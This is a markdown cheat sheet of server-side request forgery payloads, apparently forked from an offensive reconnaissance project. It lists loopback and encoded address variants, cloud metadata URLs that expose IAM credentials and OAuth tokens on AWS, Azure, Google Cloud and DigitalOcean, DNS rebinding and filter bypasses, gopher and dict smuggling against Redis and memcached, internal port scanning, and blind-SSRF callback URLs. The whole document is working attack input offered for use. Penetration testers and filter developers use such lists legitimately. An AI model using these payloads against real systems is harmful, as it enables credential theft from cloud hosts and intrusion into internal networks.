<!-- aegis-local: forked 2026-05-04 from pikpikcu/airecon@9a21453459d87eefb012ea355c79b593d0d3c0cc (MIT-licensed); attribution preserved, see ATTRIBUTION.md -->

# SSRF Payloads

## Basic SSRF
```
http://127.0.0.1
http://localhost
http://[::1]
http://0.0.0.0
http://127.1
http://127.0.1
```

## Cloud Metadata Endpoints

### AWS
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/user-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/dynamic/instance-identity/document
```

### Google Cloud
```
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/hostname
http://metadata.google.internal/computeMetadata/v1/instance/disks/
```

### Azure
```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token
```

### DigitalOcean
```
http://169.254.169.254/metadata/v1.json
http://169.254.169.254/metadata/v1/interfaces/public/0/ipv4/address
```

## Bypass Techniques

### DNS Rebinding
```
http://[random].dns.wtf
# First request: returns 127.0.0.1
# Second request: returns target
```

### DNS Shortnames
```
http://local
http://customerportal
http://internal
http://staging
```

### Protocol Smuggling
```
dict://127.0.0.1:6379/info
gopher://127.0.0.1:6379/_INFO
sftp://127.0.0.1:22
ldap://127.0.0.1:389
```

### Encoding
```
http://127.0.0.1 → http://2130706433 (decimal)
http://127.0.0.1 → http://0x7f000001 (hex)
http://127.0.0.1 → http://[::1]
http://example.com@127.0.0.1
http://127.0.0.1@example.com
http://127。0。0。1
http://127%2e0%2e0%2e1
```

### localhost Variations
```
localhost
127.0.0.1
127.1
127.0.1
0.0.0.0
::1
[::1]
```

### Filter Bypass
```
http://not127.0.0.1.ssrf.me
http://169.254.169.254.xip.io
http://metadata.google.internal
```

### Using Other Domains
```
http://169.254.169.254.udpn.de
http://metadata.googleusercontent.com
```

### Port Enumeration
```
http://127.0.0.1:22
http://127.0.0.1:3306
http://127.0.0.1:5432
http://127.0.0.1:6379
http://127.0.0.1:8080
http://127.0.0.1:8443
```

## Blind SSRF
```
http://your-server.com/reflect
http://your-server.com/log?url=
```

## Gopher Protocol
```
gopher://127.0.0.1:6379/_INFO
gopher://127.0.0.1:6379/_GET%20/test%20HTTP/1.1%0AHost:%20localhost%0A
gopher://127.0.0.1:11211/_stats
```
